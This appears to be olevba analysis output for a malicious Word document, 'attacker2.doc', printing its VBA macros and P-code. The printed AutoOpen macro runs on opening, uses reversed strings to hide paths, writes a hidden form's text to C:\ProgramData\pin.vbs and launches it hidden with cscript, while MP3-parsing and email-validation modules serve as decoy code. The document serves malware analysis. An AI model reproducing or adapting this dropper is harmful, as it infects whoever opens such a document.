pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: attacker2.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: attacker2.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
bxh.eFile
End Sub

-------------------------------------------------------------------------------
VBA MACRO bxh.bas 
in file: attacker2.doc - OLE stream: 'Macros/VBA/bxh'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub eFile()
Dim QQ1 As Object
Set QQ1 = New Form
RO = StrReverse("\ataDmargorP\:C")
ROI = RO + StrReverse("sbv.nip")
ii = StrReverse("")
Ne = StrReverse("IZOIZIMIZI")
WW = QQ1.t2.Caption
MyFile = FreeFile
Open ROI For Output As #MyFile
Print #MyFile, WW
Close #MyFile
fun = Shell(StrReverse("sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"), Chr(48))
End
End Sub

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: attacker2.doc - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub getFrameInfo(ByVal lpMP3File As String, ByRef lpFrameInfo As FHInfo, ByVal lpMP3Offset As Long)

Dim Buf As String * 4096
Dim tmpByte1 As Byte
Dim tmpByte2 As Byte
Dim tmpByte3 As Byte
Dim tmpByte4 As Byte
Dim tmpNum As Byte
Dim designator As Byte
Dim tmpLayer As Byte
Dim baseFreq As Single
Dim refFile As Integer

On Error GoTo BadFrame
lpFrameInfo.Succes = False
refFile = FreeFile
Open lpMP3File For Binary As #refFile
Get #refFile, lpMP3Offset, tmpByte1
If tmpByte1 <> &HFF Then
    On Error GoTo 0
    Close #refFile
    Exit Sub
End If
Get #refFile, , tmpByte2
If Not (Between(tmpByte2, &HE2, &HE7) Or Between(tmpByte2, &HF2, &HF7) Or Between(tmpByte2, &HFA, &HFF)) Then
    On Error GoTo 0
    Close #refFile
    Exit Sub
End If
Get #refFile, , tmpByte3
If Not (((tmpByte3 And &HF0) <> &H0) And ((tmpByte3 And &HF0) <> &HF0) And ((tmpByte3 And &HC) <> &HC)) Then
    On Error GoTo 0
    Close #refFile
    Exit Sub
End If
Get #refFile, , tmpByte4

'Getting info from 2nd byte
'Getting MPEG type info
Select Case (tmpByte2 \ 8) Mod 4
    Case 0
        lpFrameInfo.MPEGType = 3 'MPEG v2.5
        designator = 1
    Case 2
        lpFrameInfo.MPEGType = 2 'MPEG v2
        designator = 2
    Case 3
        lpFrameInfo.MPEGType = 1 'MPEG v1
        designator = 4
End Select
    
'Getting layer info
Select Case (tmpByte2 \ 2) Mod 4
    Case 1
        lpFrameInfo.Layer = 3
        tmpLayer = 3
    Case 2
        lpFrameInfo.Layer = 2
        tmpLayer = 2
    Case 3
        lpFrameInfo.Layer = 1
        tmpLayer = 1
End Select
    
'Getting CRC info
lpFrameInfo.Protection = (tmpByte2 Mod 2) - 1
    
'Getting info from 3rd byte
'Getting Bit-rate
lpFrameInfo.BitRateIndex = (tmpByte3 \ 16) Mod 16
lpFrameInfo.bitRate = arrBitRates((tmpByte2 \ 8) Mod 4, (tmpByte2 \ 2) Mod 4, (tmpByte3 \ 16) Mod 16)

'Getting frequency info (also known as Sampling Rate)
Select Case (tmpByte3 \ 4) Mod 4
    Case 0
        lpFrameInfo.SamplingRate = 11025
    Case 1
        lpFrameInfo.SamplingRate = 12000
    Case 2
        lpFrameInfo.SamplingRate = 8000
End Select
lpFrameInfo.SamplingRate = lpFrameInfo.SamplingRate * designator

'Getting number of samples
Select Case tmpLayer
    Case 1
        lpFrameInfo.Samples = 384
    Case 2
        lpFrameInfo.Samples = 1152
    Case 3
        If designator = 4 Then
            lpFrameInfo.Samples = 1152
        Else
            lpFrameInfo.Samples = 576
        End If
End Select

'Getting Padding (if set data is padded with one slot)
lpFrameInfo.Padding = (tmpByte3 \ 2) Mod 2

'Getting Private info
lpFrameInfo.PrivateBit = -(tmpByte3 Mod 2)

'Getting info from 4th byte
'Getting channel mode info
lpFrameInfo.ChannelMode = (tmpByte4 \ 64) Mod 4
lpFrameInfo.ModeExtension = (tmpByte4 \ 16) Mod 4

'Getting Copyright bit
lpFrameInfo.copyright = -((tmpByte4 \ 8) Mod 2)
    
'Getting Original bit
lpFrameInfo.Original = -((tmpByte4 \ 4) Mod 2)
    
'Getting Emphasis
lpFrameInfo.Emphasis = tmpByte4 Mod 4

'Calculate Frame Size
If tmpLayer = 1 Then
    lpFrameInfo.FrameSize = (((lpFrameInfo.Samples * lpFrameInfo.bitRate) \ lpFrameInfo.SamplingRate) \ 2) + lpFrameInfo.Padding
Else
    lpFrameInfo.FrameSize = (((lpFrameInfo.Samples * lpFrameInfo.bitRate) \ lpFrameInfo.SamplingRate) \ 8) + lpFrameInfo.Padding
End If
lpFrameInfo.Succes = True

GoodFrame:
On Error GoTo 0
Close #refFile
Exit Sub
  
BadFrame:
    Resume GoodFrame

End Sub

Public Function Valid_MP3(Track As String) As Boolean

Dim accMP3Info As MP3Info
Dim MP3Offset As Long
Dim ExtraOffset As Long

Valid_MP3 = False
MP3Offset = 1
If GetID3v2Header(Track) Then MP3Offset = (ID3v2Header.bSize1 * (2 ^ 21)) + (ID3v2Header.bSize2 * (2 ^ 14)) + (ID3v2Header.bSize3 * (2 ^ 7)) + ID3v2Header.bSize4 + 11
ExtraOffset = getMP3Info(Track, accMP3Info, MP3Offset)
If Not accMP3Info.Succes Then Exit Function
Valid_MP3 = True

End Function

Public Function Between(ByVal accNum As Byte, ByVal accDown As Byte, ByVal accUp As Byte) As Boolean
  If accNum >= accDown And accNum <= accUp Then
    Between = True
  Else
    Between = False
  End If
End Function




Private Sub UserForm_Click()

End Sub


-------------------------------------------------------------------------------
VBA MACRO Form.frm 
in file: attacker2.doc - OLE stream: 'Macros/VBA/Form'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Const Dominios As String = "AERO BIZ COM COOP EDU GOV INFO INT MIL MUSEUM NAME NET ORG PRO " & _
                                    "AC AD AE AF AG AI AL AM AN AO AQ AR AS AT AU AW AZ BA BB BD " & _
                                    "BE BF BG BH BI BJ BM BN BO BR BS BT BV BW BY BZ CA CC CD CF " & _
                                    "CG CH CI CK CL CM CN CO CR CU CV CX CY CZ DE DJ DK DM DO DZ " & _
                                    "EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GD GE GF GG GH GI " & _
                                    "GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU ID IE IL " & _
                                    "IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW " & _
                                    "KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD MG MH MK ML " & _
                                    "MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI " & _
                                    "NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW " & _
                                    "PY QA RE RO RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO " & _
                                    "SR ST SV SY SZ TC TD TF TG TH TJ TK TM TN TO TP TR TT TV TW " & _
                                    "TZ UA UG UK UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT YU " & _
                                    "ZA ZM ZW"

Public Function IsEmail(ByVal Email As String) As Boolean

Dim w        As Integer
Dim sLetra   As String
Dim sSplit() As String
     
    On Error Resume Next
    
    If Len(Email) > 0 Then
        
        If UBound(Split(Email, "@")) <> 1 Or InStr(Email, ".") = 0 Then
            Exit Function
        End If
        
        If left$(Email, 1) = "@" Or Mid$(Email, Len(Email), 1) = "@" Or InStr(Email, "@.") Or InStr(Email, ".@") Then
            Exit Function
        End If

        If left$(Email, 1) = "." Or Mid$(Email, Len(Email), 1) = "." Or InStr(Email, "..") Then
            Exit Function
        End If
        
        For w = 1 To Len(Email)
            sLetra = Mid$(Email, w, 1)
            If Not (LCase$(sLetra) Like "[a-z]" Or sLetra = "@" Or sLetra = "." Or sLetra = "-" Or sLetra = "_" Or IsNumeric(sLetra)) Then
                Exit Function
            End If
        Next w
        
        sSplit = Split(UCase$(Trim$(Email)), ".")

        If InStr(Dominios, sSplit(UBound(sSplit))) = 0 Then
            Exit Function
        End If
        
        IsEmail = True
    End If
   
   On Error GoTo 0
   
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: attacker2.doc
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1593 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld WS 
' 	ArgsMemCall eFile 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' Macros/VBA/bxh - 2724 bytes
' Line #0:
' 	FuncDefn (Sub eFile())
' Line #1:
' 	Dim 
' 	VarDefn QQ1 (As Object)
' Line #2:
' 	SetStmt 
' 	New Form
' 	Set QQ1 
' Line #3:
' 	LitStr 0x000F "\ataDmargorP\:C"
' 	ArgsLd StrReverse 0x0001 
' 	St RO 
' Line #4:
' 	Ld RO 
' 	LitStr 0x0007 "sbv.nip"
' 	ArgsLd StrReverse 0x0001 
' 	Add 
' 	St ROI 
' Line #5:
' 	LitStr 0x0000 ""
' 	ArgsLd StrReverse 0x0001 
' 	St ii 
' Line #6:
' 	LitStr 0x000A "IZOIZIMIZI"
' 	ArgsLd StrReverse 0x0001 
' 	St Ne 
' Line #7:
' 	Ld QQ1 
' 	MemLd t2 
' 	MemLd Caption 
' 	St WW 
' Line #8:
' 	Ld FreeFile 
' 	St MyFile 
' Line #9:
' 	Ld ROI 
' 	Ld MyFile 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #10:
' 	Ld MyFile 
' 	Sharp 
' 	PrintChan 
' 	Ld WW 
' 	PrintItemNL 
' Line #11:
' 	Ld MyFile 
' 	Sharp 
' 	Close 0x0001 
' Line #12:
' 	LitStr 0x0029 "sbv.nip\ataDmargorP\:C exe.tpircsc k/ dmc"
' 	ArgsLd StrReverse 0x0001 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd HH0 0x0002 
' 	St RetVal 
' Line #13:
' 	End 
' Line #14:
' 	EndSub 
' Line #15:
' Macros/VBA/Module1 - 15671 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub eFile2(ByVal getFrameInfo As String, ByRef lpMP3File As , ByVal FHInfo As Long))
' Line #2:
' Line #3:
' 	Dim 
' 	LitDI2 0x1000 
' 	VarDefn lpMP3Offset
' Line #4:
' 	Dim 
' 	VarDefn Main (As Byte)
' Line #5:
' 	Dim 
' 	VarDefn tmpByte1 (As Byte)
' Line #6:
' 	Dim 
' 	VarDefn Buf (As Byte)
' Line #7:
' 	Dim 
' 	VarDefn tmpByte3 (As Byte)
' Line #8:
' 	Dim 
' 	VarDefn tmpByte4 (As Byte)
' Line #9:
' 	Dim 
' 	VarDefn tmpNum (As Byte)
' Line #10:
' 	Dim 
' 	VarDefn designator (As Byte)
' Line #11:
' 	Dim 
' 	VarDefn tmpLayer (As Single)
' Line #12:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #13:
' Line #14:
' 	OnError baseFreq 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld lpMP3File 
' 	MemSt BadFrame 
' Line #16:
' 	Ld FreeFile 
' 	St j 
' Line #17:
' 	Ld getFrameInfo 
' 	Ld j 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #18:
' 	Ld j 
' 	Sharp 
' 	Ld FHInfo 
' 	Ld Main 
' 	GetRec 
' Line #19:
' 	Ld Main 
' 	LitHI2 0x00FF 
' 	Ne 
' 	IfBlock 
' Line #20:
' 	OnError (GoTo 0) 
' Line #21:
' 	Ld j 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	ExitSub 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld j 
' 	Sharp 
' 	LitDefault 
' 	Ld tmpByte1 
' 	GetRec 
' Line #25:
' 	Ld tmpByte1 
' 	LitHI2 0x00E2 
' 	LitHI2 0x00E7 
' 	ArgsLd Succes 0x0003 
' 	Ld tmpByte1 
' 	LitHI2 0x00F2 
' 	LitHI2 0x00F7 
' 	ArgsLd Succes 0x0003 
' 	Or 
' 	Ld tmpByte1 
' 	LitHI2 0x00FA 
' 	LitHI2 0x00FF 
' 	ArgsLd Succes 0x0003 
' 	Or 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #26:
' 	OnError (GoTo 0) 
' Line #27:
' 	Ld j 
' 	Sharp 
' 	Close 0x0001 
' Line #28:
' 	ExitSub 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld j 
' 	Sharp 
' 	LitDefault 
' 	Ld Buf 
' 	GetRec 
' Line #31:
' 	Ld Buf 
' 	LitHI2 0x00F0 
' 	And 
' 	Paren 
' 	LitHI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld Buf 
' 	LitHI2 0x00F0 
' 	And 
' 	Paren 
' 	LitHI2 0x00F0 
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Buf 
' 	LitHI2 0x000C 
' 	And 
' 	Paren 
' 	LitHI2 0x000C 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #32:
' 	OnError (GoTo 0) 
' Line #33:
' 	Ld j 
' 	Sharp 
' 	Close 0x0001 
' Line #34:
' 	ExitSub 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld j 
' 	Sharp 
' 	LitDefault 
' 	Ld tmpByte3 
' 	GetRec 
' Line #37:
' Line #38:
' 	QuoteRem 0x0000 0x001A "Getting info from 2nd byte"
' Line #39:
' 	QuoteRem 0x0000 0x0016 "Getting MPEG type info"
' Line #40:
' 	Ld tmpByte1 
' 	LitDI2 0x0008 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	SelectCase 
' Line #41:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #42:
' 	LitDI2 0x0003 
' 	Ld lpMP3File 
' 	MemSt Between 
' 	QuoteRem 0x0021 0x0009 "MPEG v2.5"
' Line #43:
' 	LitDI2 0x0001 
' 	St tmpNum 
' Line #44:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #45:
' 	LitDI2 0x0002 
' 	Ld lpMP3File 
' 	MemSt Between 
' 	QuoteRem 0x0021 0x0007 "MPEG v2"
' Line #46:
' 	LitDI2 0x0002 
' 	St tmpNum 
' Line #47:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld lpMP3File 
' 	MemSt Between 
' 	QuoteRem 0x0021 0x0007 "MPEG v1"
' Line #49:
' 	LitDI2 0x0004 
' 	St tmpNum 
' Line #50:
' 	EndSelect 
' Line #51:
' Line #52:
' 	QuoteRem 0x0000 0x0012 "Getting layer info"
' Line #53:
' 	Ld tmpByte1 
' 	LitDI2 0x0002 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	SelectCase 
' Line #54:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #55:
' 	LitDI2 0x0003 
' 	Ld lpMP3File 
' 	MemSt MPEGType 
' Line #56:
' 	LitDI2 0x0003 
' 	St designator 
' Line #57:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #58:
' 	LitDI2 0x0002 
' 	Ld lpMP3File 
' 	MemSt MPEGType 
' Line #59:
' 	LitDI2 0x0002 
' 	St designator 
' Line #60:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld lpMP3File 
' 	MemSt MPEGType 
' Line #62:
' 	LitDI2 0x0001 
' 	St designator 
' Line #63:
' 	EndSelect 
' Line #64:
' Line #65:
' 	QuoteRem 0x0000 0x0010 "Getting CRC info"
' Line #66:
' 	Ld tmpByte1 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld lpMP3File 
' 	MemSt Layer 
' Line #67:
' Line #68:
' 	QuoteRem 0x0000 0x001A "Getting info from 3rd byte"
' Line #69:
' 	QuoteRem 0x0000 0x0010 "Getting Bit-rate"
' Line #70:
' 	Ld Buf 
' 	LitDI2 0x0010 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0010 
' 	Mod 
' 	Ld lpMP3File 
' 	MemSt Protection 
' Line #71:
' 	Ld tmpByte1 
' 	LitDI2 0x0008 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Ld tmpByte1 
' 	LitDI2 0x0002 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Ld Buf 
' 	LitDI2 0x0010 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0010 
' 	Mod 
' 	ArgsLd bitRate 0x0003 
' 	Ld lpMP3File 
' 	MemSt BitRateIndex 
' Line #72:
' Line #73:
' 	QuoteRem 0x0000 0x0034 "Getting frequency info (also known as Sampling Rate)"
' Line #74:
' 	Ld Buf 
' 	LitDI2 0x0004 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	SelectCase 
' Line #75:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #76:
' 	LitDI2 0x2B11 
' 	Ld lpMP3File 
' 	MemSt arrBitRates 
' Line #77:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #78:
' 	LitDI2 0x2EE0 
' 	Ld lpMP3File 
' 	MemSt arrBitRates 
' Line #79:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #80:
' 	LitDI2 0x1F40 
' 	Ld lpMP3File 
' 	MemSt arrBitRates 
' Line #81:
' 	EndSelect 
' Line #82:
' 	Ld lpMP3File 
' 	MemLd arrBitRates 
' 	Ld tmpNum 
' 	Mul 
' 	Ld lpMP3File 
' 	MemSt arrBitRates 
' Line #83:
' Line #84:
' 	QuoteRem 0x0000 0x0019 "Getting number of samples"
' Line #85:
' 	Ld designator 
' 	SelectCase 
' Line #86:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #87:
' 	LitDI2 0x0180 
' 	Ld lpMP3File 
' 	MemSt SamplingRate 
' Line #88:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #89:
' 	LitDI2 0x0480 
' 	Ld lpMP3File 
' 	MemSt SamplingRate 
' Line #90:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #91:
' 	Ld tmpNum 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #92:
' 	LitDI2 0x0480 
' 	Ld lpMP3File 
' 	MemSt SamplingRate 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	LitDI2 0x0240 
' 	Ld lpMP3File 
' 	MemSt SamplingRate 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSelect 
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x0035 "Getting Padding (if set data is padded with one slot)"
' Line #99:
' 	Ld Buf 
' 	LitDI2 0x0002 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0002 
' 	Mod 
' 	Ld lpMP3File 
' 	MemSt Samples 
' Line #100:
' Line #101:
' 	QuoteRem 0x0000 0x0014 "Getting Private info"
' Line #102:
' 	Ld Buf 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	UMi 
' 	Ld lpMP3File 
' 	MemSt Padding 
' Line #103:
' Line #104:
' 	QuoteRem 0x0000 0x001A "Getting info from 4th byte"
' Line #105:
' 	QuoteRem 0x0000 0x0019 "Getting channel mode info"
' Line #106:
' 	Ld tmpByte3 
' 	LitDI2 0x0040 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Ld lpMP3File 
' 	MemSt PrivateBit 
' Line #107:
' 	Ld tmpByte3 
' 	LitDI2 0x0010 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	Ld lpMP3File 
' 	MemSt ChannelMode 
' Line #108:
' Line #109:
' 	QuoteRem 0x0000 0x0015 "Getting Copyright bit"
' Line #110:
' 	Ld tmpByte3 
' 	LitDI2 0x0008 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	UMi 
' 	Ld lpMP3File 
' 	MemSt ModeExtension 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x0014 "Getting Original bit"
' Line #113:
' 	Ld tmpByte3 
' 	LitDI2 0x0004 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	UMi 
' 	Ld lpMP3File 
' 	MemSt copyright 
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x0010 "Getting Emphasis"
' Line #116:
' 	Ld tmpByte3 
' 	LitDI2 0x0004 
' 	Mod 
' 	Ld lpMP3File 
' 	MemSt Original 
' Line #117:
' Line #118:
' 	QuoteRem 0x0000 0x0014 "Calculate Frame Size"
' Line #119:
' 	Ld designator 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #120:
' 	Ld lpMP3File 
' 	MemLd SamplingRate 
' 	Ld lpMP3File 
' 	MemLd BitRateIndex 
' 	Mul 
' 	Paren 
' 	Ld lpMP3File 
' 	MemLd arrBitRates 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0002 
' 	IDiv 
' 	Paren 
' 	Ld lpMP3File 
' 	MemLd Samples 
' 	Add 
' 	Ld lpMP3File 
' 	MemSt Emphasis 
' Line #121:
' 	ElseBlock 
' Line #122:
' 	Ld lpMP3File 
' 	MemLd SamplingRate 
' 	Ld lpMP3File 
' 	MemLd BitRateIndex 
' 	Mul 
' 	Paren 
' 	Ld lpMP3File 
' 	MemLd arrBitRates 
' 	IDiv 
' 	Paren 
' 	LitDI2 0x0008 
' 	IDiv 
' 	Paren 
' 	Ld lpMP3File 
' 	MemLd Samples 
' 	Add 
' 	Ld lpMP3File 
' 	MemSt Emphasis 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	LitVarSpecial (True)
' 	Ld lpMP3File 
' 	MemSt BadFrame 
' Line #125:
' Line #126:
' 	Label FrameSize 
' Line #127:
' 	OnError (GoTo 0) 
' Line #128:
' 	Ld j 
' 	Sharp 
' 	Close 0x0001 
' Line #129:
' 	ExitSub 
' Line #130:
' Line #131:
' 	Label baseFreq 
' Line #132:
' 	Resume FrameSize 
' Line #133:
' Line #134:
' 	EndSub 
' Line #135:
' Line #136:
' 	FuncDefn (Public Function GoodFrame(Valid_MP3 As String) As Boolean)
' Line #137:
' Line #138:
' 	Dim 
' 	VarDefn Track (As accMP3Info)
' Line #139:
' 	Dim 
' 	VarDefn get_well (As Long)
' Line #140:
' 	Dim 
' 	VarDefn MP3Info (As Long)
' Line #141:
' Line #142:
' 	LitVarSpecial (False)
' 	St GoodFrame 
' Line #143:
' 	LitDI2 0x0001 
' 	St get_well 
' Line #144:
' 	Ld Valid_MP3 
' 	ArgsLd ExtraOffset 0x0001 
' 	If 
' 	BoSImplicit 
' 	Ld iGenre 
' 	MemLd ID3v2TagHeader 
' 	LitDI2 0x0002 
' 	LitDI2 0x0015 
' 	Pwr 
' 	Paren 
' 	Mul 
' 	Paren 
' 	Ld iGenre 
' 	MemLd bSize1 
' 	LitDI2 0x0002 
' 	LitDI2 0x000E 
' 	Pwr 
' 	Paren 
' 	Mul 
' 	Paren 
' 	Add 
' 	Ld iGenre 
' 	MemLd bSize2 
' 	LitDI2 0x0002 
' 	LitDI2 0x0007 
' 	Pwr 
' 	Paren 
' 	Mul 
' 	Paren 
' 	Add 
' 	Ld iGenre 
' 	MemLd bSize3 
' 	Add 
' 	LitDI2 0x000B 
' 	Add 
' 	St get_well 
' 	EndIf 
' Line #145:
' 	Ld Valid_MP3 
' 	Ld Track 
' 	Ld get_well 
' 	ArgsLd GetID3v2Header 0x0003 
' 	St MP3Info 
' Line #146:
' 	Ld Track 
' 	MemLd BadFrame 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #147:
' 	LitVarSpecial (True)
' 	St GoodFrame 
' Line #148:
' Line #149:
' 	EndFunc 
' Line #150:
' Line #151:
' 	FuncDefn (Public Function Succes(ByVal getMP3Info As Byte, ByVal accNum As Byte, ByVal accDown As Byte) As Boolean)
' Line #152:
' 	Ld getMP3Info 
' 	Ld accNum 
' 	Ge 
' 	Ld getMP3Info 
' 	Ld accDown 
' 	Le 
' 	And 
' 	IfBlock 
' Line #153:
' 	LitVarSpecial (True)
' 	St Succes 
' Line #154:
' 	ElseBlock 
' Line #155:
' 	LitVarSpecial (False)
' 	St Succes 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndFunc 
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' 	FuncDefn (Private Sub UserForm())
' Line #163:
' Line #164:
' 	EndSub 
' Line #165:
' Line #166:
' Macros/VBA/Form - 6655 bytes
' Line #0:
' Line #1:
' 	LineCont 0x0034 08 00 24 00 0A 00 24 00 0C 00 24 00 0E 00 24 00 10 00 24 00 12 00 24 00 14 00 24 00 16 00 24 00 18 00 24 00 1A 00 24 00 1C 00 24 00 1E 00 24 00 20 00 24 00
' 	Dim (Private Const) 
' 	LitStr 0x003F "AERO BIZ COM COOP EDU GOV INFO INT MIL MUSEUM NAME NET ORG PRO "
' 	LitStr 0x003C "AC AD AE AF AG AI AL AM AN AO AQ AR AS AT AU AW AZ BA BB BD "
' 	Concat 
' 	LitStr 0x003C "BE BF BG BH BI BJ BM BN BO BR BS BT BV BW BY BZ CA CC CD CF "
' 	Concat 
' 	LitStr 0x003C "CG CH CI CK CL CM CN CO CR CU CV CX CY CZ DE DJ DK DM DO DZ "
' 	Concat 
' 	LitStr 0x003C "EC EE EG EH ER ES ET FI FJ FK FM FO FR GA GD GE GF GG GH GI "
' 	Concat 
' 	LitStr 0x003C "GL GM GN GP GQ GR GS GT GU GW GY HK HM HN HR HT HU ID IE IL "
' 	Concat 
' 	LitStr 0x003C "IM IN IO IQ IR IS IT JE JM JO JP KE KG KH KI KM KN KP KR KW "
' 	Concat 
' 	LitStr 0x003C "KY KZ LA LB LC LI LK LR LS LT LU LV LY MA MC MD MG MH MK ML "
' 	Concat 
' 	LitStr 0x003C "MM MN MO MP MQ MR MS MT MU MV MW MX MY MZ NA NC NE NF NG NI "
' 	Concat 
' 	LitStr 0x003C "NL NO NP NR NU NZ OM PA PE PF PG PH PK PL PM PN PR PS PT PW "
' 	Concat 
' 	LitStr 0x003C "PY QA RE RO RU RW SA SB SC SD SE SG SH SI SJ SK SL SM SN SO "
' 	Concat 
' 	LitStr 0x003C "SR ST SV SY SZ TC TD TF TG TH TJ TK TM TN TO TP TR TT TV TW "
' 	Concat 
' 	LitStr 0x003C "TZ UA UG UK UM US UY UZ VA VC VE VG VI VN VU WF WS YE YT YU "
' 	Concat 
' 	LitStr 0x0008 "ZA ZM ZW"
' 	Concat 
' 	VarDefn vbPicTypeIcon (As String)
' Line #2:
' Line #3:
' 	FuncDefn (Public Function Dominios(ByVal IsEmail As String, id_FFFE As Boolean) As Boolean)
' Line #4:
' Line #5:
' 	Dim 
' 	VarDefn Email (As Integer) 0x000D
' Line #6:
' 	Dim 
' 	VarDefn w (As String) 0x000D
' Line #7:
' 	Dim 
' 	VarDefn sLetra (As String)
' Line #8:
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' Line #11:
' 	Ld IsEmail 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #12:
' Line #13:
' 	Ld IsEmail 
' 	LitStr 0x0001 "@"
' 	ArgsLd sSplit 0x0002 
' 	FnUBound 0x0000 
' 	LitDI2 0x0001 
' 	Ne 
' 	Ld IsEmail 
' 	LitStr 0x0001 "."
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #14:
' 	ExitFunc 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	Ld IsEmail 
' 	LitDI2 0x0001 
' 	ArgsLd Left$ 0x0002 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	Ld IsEmail 
' 	Ld IsEmail 
' 	FnLen 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	Or 
' 	Ld IsEmail 
' 	LitStr 0x0002 "@."
' 	FnInStr 
' 	Or 
' 	Ld IsEmail 
' 	LitStr 0x0002 ".@"
' 	FnInStr 
' 	Or 
' 	IfBlock 
' Line #18:
' 	ExitFunc 
' Line #19:
' 	EndIfBlock 
' Line #20:
' Line #21:
' 	Ld IsEmail 
' 	LitDI2 0x0001 
' 	ArgsLd Left$ 0x0002 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Ld IsEmail 
' 	Ld IsEmail 
' 	FnLen 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Or 
' 	Ld IsEmail 
' 	LitStr 0x0002 ".."
' 	FnInStr 
' 	Or 
' 	IfBlock 
' Line #22:
' 	ExitFunc 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	StartForVariable 
' 	Ld Email 
' 	EndForVariable 
